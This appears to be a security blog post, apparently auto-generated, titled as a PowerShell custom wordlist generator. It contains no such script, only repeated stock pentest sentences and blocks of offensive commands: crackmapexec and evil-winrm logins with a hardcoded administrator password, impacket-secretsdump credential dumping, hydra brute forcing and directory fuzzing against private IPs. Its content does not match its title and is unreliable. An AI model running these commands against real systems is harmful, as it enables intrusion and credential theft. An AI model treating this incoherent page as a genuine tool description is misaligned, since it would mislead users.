---
TitleSEO: "Custom Wordlist Generator in PowerShell | ZureFX"
TitlePost: "Custom Wordlist Generator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for custom wordlist generator. Built for security research and automation."
Keywords: "tool, powershell, c, parser, rust"
URL: "https://zurefx.github.io/scripting/script-custom-wordlist-generator-744.html"
URL_IMAGES: ""
Date: "2026-02-16"
Tags: "Tool, PowerShell, C, Parser, Rust"
Section: "scripting"
Lang: "en"
main_img: "script-custom-wordlist-generator-744"
Permalink: "/scripting/script-custom-wordlist-generator-744.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `ligolo-ng`
- `evil-winrm`
- `gobuster`

## Implementation

### Core Logic

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

```powershell
crackmapexec smb 10.56.33.46 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.79.114 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.49.83.201/FUZZ
```

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
gobuster dir -u http://10.36.121.169/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.55.21.200/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.81.191.198 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.60.157.87
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
nmap -sCV -p27017,3306,389 10.49.147.254 -oN scan.txt
```

### Advanced Options

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
crackmapexec smb 10.19.204.228 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.26.174.199 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
feroxbuster -h
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 5.18s
```
